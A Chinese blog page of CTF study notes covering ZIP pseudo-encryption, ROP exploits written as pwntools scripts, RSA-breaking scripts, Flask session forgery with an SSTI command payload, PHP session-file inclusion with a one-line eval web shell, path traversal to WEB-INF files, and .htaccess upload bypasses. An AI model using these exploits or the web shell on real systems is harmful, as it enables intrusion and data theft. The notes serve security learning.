+<p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 65：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>666C61672E7478740A00200000000000010018000FF504D59AC5D201461FCB8A9AC5D201461FCB8A9AC5D201</p>
+<p>c.压缩源文件目录结束标志:</p>
+<p>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>5A 00 00 00：目录区尺寸大小<br>3F 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 00：ZIP 文件注释长度</p>
+<p>识别真假加密<br>无加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p>
+<p>假加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
+<p>把09 00 改成00 00 之后，保存，重新打开，即可看到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-pwn" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/18/pwn/" class="article-date">
+  	<time datetime="2025-04-18T12:59:41.306Z" itemprop="datePublished">2025-04-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PWD"><a href="#PWD" class="headerlink" title="PWD"></a>PWD</h1><p>[TOC]</p>
+<h3 id="1-rdi-ret-地址的获取"><a href="#1-rdi-ret-地址的获取" class="headerlink" title="1.rdi ret 地址的获取"></a>1.rdi ret 地址的获取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn(文件名) --only &quot;pop|ret&quot; | grep rdi</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0xA+8) + p64(pop_rdi) + p64(bin_sh)  + p64(ret) + p64(system)</span><br></pre></td></tr></table></figure>
+
+<p><strong>–binary pwn: 指定了要分析的二进制文件的文件名</strong><br><strong>–only “pop|ret”: 指定了只查找包含”pop”和”ret”指令序列的代码片段，这些指令通常用于弹出寄存器中的值，并将控制流返回到调用函数的地址处，是ROP攻击中常用的gadgets</strong> </p>
+<p><strong>| grep rdi: 将ROPgadget的输出传递给grep命令，然后使用grep命令筛选出包含”rdi”寄存器的代码片段，这样就可以只找到包含”pop|ret”指令序列并且弹出rdi寄存器的gadgets</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28286)</span><br><span class="line">payload = b&#x27;a&#x27;*(0xA+8) + p64(0x4007e3) + p64(0x400808) + p64(0x4004fe) + p64(0x400520)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>在64位的Linux系统中，参数传递是通过寄存器来完成的，而 system 函数的第一个参数（即需要执行的命令字符串）是通过 rdi 寄存器传递的，所以，我们首先需要将 &#x2F;bin&#x2F;sh 字符串的地址放入 rdi 寄存器中，然后才能调用system函数，这就是为什么我们需要知道 pop rdi ;ret 指令序列的地址，因为它会将栈顶的值弹出到 rdi 寄存器中，而 ret 指令的作用是用于绕过栈中的返回地址，通过 ret 指令返回到调用者，从而间接地调用 system 函数。</strong> </p>
+<h3 id="2-sh"><a href="#2-sh" class="headerlink" title="2.sh"></a>2.sh</h3><p><strong>“sh” 指向依赖一个被 PATH 环境变量指定的 shell，而 “&#x2F;bin&#x2F;sh” 直接指向系统中一个默认的 shell 可执行文件。</strong></p>
+<p>这里我们可以将这个字符串（’sh’）的地址作为参数传递给 system 函数的第一个参数，通常是一个指向要执行的命令的字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x12+4) + p32(system) + p32(0) + p32(sh)</span><br></pre></td></tr></table></figure>
+
+<p><strong>(system的地址在ida中指的是_system的地址)</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28213)</span><br><span class="line">payload = b&#x27;a&#x27;*(0xA+8) + p64(0x400843) + p64(0x400872) + p64(0x40053e) + p64(0x400560)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-fd"><a href="#3-fd" class="headerlink" title="3.fd"></a>3.fd</h3><p><img src="https://pic3.zhimg.com/v2-0d5932332a96e3cc797fc7b3dea499a0_1440w.jpg" alt="img"></p>
+<p>首先读取最多14个字符到bss段的变量info中，然后读取最多0x4B到栈变量。</p>
+<p>并且继续寻找发现程序提供了system函数，显而易见，直接ret2shellcode。</p>
+<p>如果就这样结束了，这题一定被冲烂了。程序加了一个限制check函数：</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-CRY" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/18/CRY/" class="article-date">
+  	<time datetime="2025-04-18T12:08:16.960Z" itemprop="datePublished">2025-04-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-给了n-e-c"><a href="#1-给了n-e-c" class="headerlink" title="1.给了n,e,c"></a>1.给了n,e,c</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from math import isqrt</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line"># 公钥和密文</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">n = 7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533</span><br><span class="line"></span><br><span class="line">c = 3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616</span><br><span class="line"></span><br><span class="line">def fermat_factor(n):</span><br><span class="line"></span><br><span class="line">    a = isqrt(n) + 1</span><br><span class="line"></span><br><span class="line">    b_sq = a * a - n</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line"></span><br><span class="line">        b = isqrt(b_sq)</span><br><span class="line"></span><br><span class="line">        if b * b == b_sq:</span><br><span class="line"></span><br><span class="line">            return (a - b, a + b)</span><br><span class="line"></span><br><span class="line">        b_sq += 2 * a + 1  # 更新为下一个可能的平方数</span><br><span class="line"></span><br><span class="line">        a += 1</span><br><span class="line"></span><br><span class="line"># 分解n得到p和q</span><br><span class="line"></span><br><span class="line">p, q = fermat_factor(n)</span><br><span class="line"></span><br><span class="line"># 计算私钥d</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"># 解密密文</span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line"># 转换为明文</span><br><span class="line"></span><br><span class="line">plaintext = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">print(plaintext.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">from sympy import prevprime</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">n = 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791</span><br><span class="line">c = 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829</span><br><span class="line"></span><br><span class="line"># 分解n</span><br><span class="line">p = prevprime(gmpy2.iroot(n,2)[0])</span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line"># 求d</span><br><span class="line">d = gmpy2.invert(e,(p-1) * (q-1))</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(pow(c,d,n)))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-ezCRT"><a href="#2-ezCRT" class="headerlink" title="2.ezCRT"></a>2.ezCRT</h3><p>打开附件给了n1,n2,n3,c1,c2,c3,集合crt中国剩余定理，交给deepseek分析，即可得到明文。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">n1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681</span><br><span class="line"></span><br><span class="line">n2 = 82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063</span><br><span class="line"></span><br><span class="line">n3 = 62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093</span><br><span class="line"></span><br><span class="line">c1 = 36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165</span><br><span class="line"></span><br><span class="line">c2 = 58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023</span><br><span class="line"></span><br><span class="line">c3 = 23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614</span><br><span class="line"></span><br><span class="line">def crt(a_list, m_list):</span><br><span class="line"></span><br><span class="line">    N = 1</span><br><span class="line"></span><br><span class="line">    for m in m_list:</span><br><span class="line"></span><br><span class="line">        N *= m</span><br><span class="line"></span><br><span class="line">    x = 0</span><br><span class="line"></span><br><span class="line">    for a, m in zip(a_list, m_list):</span><br><span class="line"></span><br><span class="line">        ni = N // m</span><br><span class="line"></span><br><span class="line">        inv = pow(ni, -1, m)</span><br><span class="line"></span><br><span class="line">        x = (x + a * ni * inv) % N</span><br><span class="line"></span><br><span class="line">    return x</span><br><span class="line"></span><br><span class="line">c = crt([c1, c2, c3], [n1, n2, n3])</span><br><span class="line"></span><br><span class="line">def integer_cube_root(c):</span><br><span class="line"></span><br><span class="line">    low, high = 0, c</span><br><span class="line"></span><br><span class="line">    while low &lt;= high:</span><br><span class="line"></span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line"></span><br><span class="line">        mid_cubed = mid ** 3</span><br><span class="line"></span><br><span class="line">        if mid_cubed == c:</span><br><span class="line"></span><br><span class="line">            return mid</span><br><span class="line"></span><br><span class="line">        elif mid_cubed &lt; c:</span><br><span class="line"></span><br><span class="line">            low = mid + 1</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line"></span><br><span class="line">            high = mid - 1</span><br><span class="line"></span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">m = integer_cube_root(c)</span><br><span class="line"></span><br><span class="line">if m is not None:</span><br><span class="line"></span><br><span class="line">    hex_str = hex(m)[2:]</span><br><span class="line"></span><br><span class="line">    if len(hex_str) % 2!= 0:</span><br><span class="line"></span><br><span class="line">        hex_str = &#x27;0&#x27; + hex_str</span><br><span class="line"></span><br><span class="line">    from binascii import unhexlify</span><br><span class="line"></span><br><span class="line">    bytes_data = unhexlify(hex_str)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line"></span><br><span class="line">        print(bytes_data.decode(&#x27;latin-1&#x27;))</span><br><span class="line"></span><br><span class="line">    except UnicodeDecodeError:</span><br><span class="line"></span><br><span class="line">        print(&quot;使用latin-1编码解码失败，可尝试其他编码格式&quot;)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">    print(&quot;解密失败：非正确立方根&quot;)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-session" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/17/session/" class="article-date">
+  	<time datetime="2025-04-17T12:12:42.279Z" itemprop="datePublished">2025-04-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>flask之session伪造</p>
+<p>[TOC]</p>
+<h4 id="脚本使用方法"><a href="#脚本使用方法" class="headerlink" title="脚本使用方法"></a>脚本使用方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解密：python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值”</span><br><span class="line">加密：python flask_session_cookie_manager3.py encode -s “secret_key” -t “需要加密的session值”</span><br></pre></td></tr></table></figure>
+
+<p><strong>eg.</strong> sqctf 千查万别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python  flask_session_cookie_manager3.py encode -s &quot;Dark_Flame&quot; -t &quot;</span><br><span class="line"> &#123;&#x27;username&#x27;: &#x27;&#123;&#123; </span><br><span class="line">self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\&#x27;c</span><br><span class="line"> at /flag\&#x27;).read() &#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/view?doc=/proc/1/environ </span><br><span class="line">/proc/self/environ 是一个非常有用的接口 用于获取当前进程的环境变量</span><br></pre></td></tr></table></figure>
+
+<p>1.<strong><code>/proc/[pid]/environ</code> 是一个虚拟文件，其中 <code>[pid]</code> 是进程的 ID。</strong> </p>
+<p>2.<strong>在大多数 Linux 系统中，进程 ID 为 1 的进程是系统的初始化进程。</strong> </p>
+<h4 id="eg2"><a href="#eg2" class="headerlink" title="eg2:"></a>eg2:</h4><p><strong>parload:</strong></p>
+<p>这是Load URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f903c3a6-f3bf-4bb4-bb8c-4da0754be0fe.www.polarctf.com:8090/action.php/file=/tmp/sess_uqp4q7qfifk2i3r58j55q79ga1</span><br></pre></td></tr></table></figure>
+
+<p><strong>POST：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=hhhh(先上传查到cookie)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最后上传一句话木马name=&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">再用蚁剑连接 即可得到flag</span><br></pre></td></tr></table></figure>
+
+<p>session文件名的构造是sess_ + sessionid ， sessionid在cookie中可以查看</p>
+<p>有了参数，开始猜存放session文件的位置，一般默认为tmp，直接执行命令访问session文件</p>
+<p>这里可以采取两种方式得到flag：命令读取或者蚁剑连接shell</p>
+<h4 id="eg-3-polar-safe-include"><a href="#eg-3-polar-safe-include" class="headerlink" title="eg.3 polar safe_include"></a>eg.3 polar safe_include</h4><p><strong>session文件包含</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">@session_start();</span><br><span class="line"></span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/:/tmp/&#x27;); </span><br><span class="line"></span><br><span class="line">$sys = @$_SESSION[&#x27;xxs&#x27;];</span><br><span class="line">if (isset($_GET[&#x27;xxs&#x27;])) &#123;</span><br><span class="line">    $sys = $_GET[&#x27;xxs&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@include $sys;</span><br><span class="line"></span><br><span class="line">$_SESSION[&#x27;xxs&#x27;] = $sys;</span><br></pre></td></tr></table></figure>
+
+<p>先写入恶意session文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xxs=&lt;?php+system(&#x27;tac+/f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>+</code> 在 URL 中表示空格（URL 编码中空格也可以表示为 <code>%20</code>）</li>
+</ul>
+<p>再包含恶意session文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?xxs=/tmp/sess_cofdad2n8lie1e30im77qhbrv6</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-JavaWeb--深入Servlet" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/16/JavaWeb--%E6%B7%B1%E5%85%A5Servlet/" class="article-date">
+  	<time datetime="2025-04-16T12:15:41.500Z" itemprop="datePublished">2025-04-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JavaWeb–深入Servlet"><a href="#JavaWeb–深入Servlet" class="headerlink" title="JavaWeb–深入Servlet"></a><strong>JavaWeb–深入Servlet</strong></h1><p>[TOC]</p>
+<h3 id="一、剖析Servlet"><a href="#一、剖析Servlet" class="headerlink" title="一、剖析Servlet:"></a>一、剖析Servlet:</h3><p><strong>(1)</strong> <strong>概述</strong>：</p>
+<p>Servlet是一种独立于平台和协议的服务器端的Java应用程序，可以生成动态的web页面。它担当Web浏览器或其他http客户程序发出请求、与http服务器上的数据库或应用程序之间交互的中间层。</p>
+<p><strong>(2)</strong> <strong>基本知识</strong></p>
+<p>1.<strong>配置</strong> </p>
+<p>编辑好的servlet源文件并不能响应用户请求，还必须将其编译成class文件，将编译好的class文件放到WEB-INF&#x2F;classes路径下，如果servlet有包，则还需要将class文件放到包路径下</p>
+<p>2.<strong>访问servlet的配置参数</strong>：</p>
+<p>配置servelet时，还可以增加额外的配置参数，通过使用配置参数，可以实现提供更好的可移植性，避免将参数以编码方式卸载程序代码中。</p>
+<p>配置参数有两种方式：</p>
+<p>(1)通过@WebServlet的initParams属性来指定。</p>
+<p>(2)通过在<strong>web.xml</strong>文件的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/DownloadServlet?filename=/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/JavaWeb--%E6%B7%B1%E5%85%A5Servlet/image-20250417205855534.png" alt="image-20250417205855534"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/DownloadServlet?filename=/WEB-INF/classes/com/ctf/flag/FlagManager.class</span><br></pre></td></tr></table></figure>
+
+<p>(用POST传参将Class文件下载下来)</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/04/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  	<time datetime="2025-04-09T09:44:05.324Z" itemprop="datePublished">2025-04-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>[TOC]</p>
+<h2 id="常见的文件上传漏洞的waf与绕过主要存在以下手段："><a href="#常见的文件上传漏洞的waf与绕过主要存在以下手段：" class="headerlink" title="常见的文件上传漏洞的waf与绕过主要存在以下手段："></a>常见的文件上传漏洞的waf与绕过主要存在以下手段：</h2><p><strong>①前端检测Content-Type字段的值，通过抓成功的包后修改内容和后缀绕过</strong></p>
+<p><strong>②黑名单检测，可以通过双写、大小写、空格绕过:(.php )、点绕过:(.php.)、$DATA绕过、Apache解析漏洞（利用apache从右往左解析后缀的特性）、.htaccess解析绕过</strong></p>
+<p><strong>③白名单检测，可以使用00截断（%00截断与0x00截断）</strong></p>
+<p><strong>④文件幻术检测、文件内容检测、APACHE解析漏洞等</strong></p>
+<h3 id="1-htaccess"><a href="#1-htaccess" class="headerlink" title="1..htaccess"></a>1..htaccess</h3><p><strong>[GHCTF 2025]UPUPUP</strong></p>
+<p>随便上传文件，发现有文件后缀检测，不能用php，随后想到上传.htaccess再上传图片马，但是现实非法文件</p>
+<p>于是添加前缀<strong>GIF89a</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;FilesMatch  &quot;shell.png&quot;&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后发现报错500，这种情况一般是语法有问题。所以应该是<strong>GIF89a</strong>引发了语法问题，那怎么办呢？</p>
+<p><strong>在.htaccess中有两个注释符，或者相当于单行注释的符号，分别是</strong>#<strong>和</strong>\x00****。</p>
+<p>然后分别有两种图片能绕过：</p>
+<p>XBN：</p>
+<p>这个可以放在文件任意位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>WBMP：</p>
+<p>不过这个只能放在文件开头的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x85\x85</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以上传.htaccess</p>
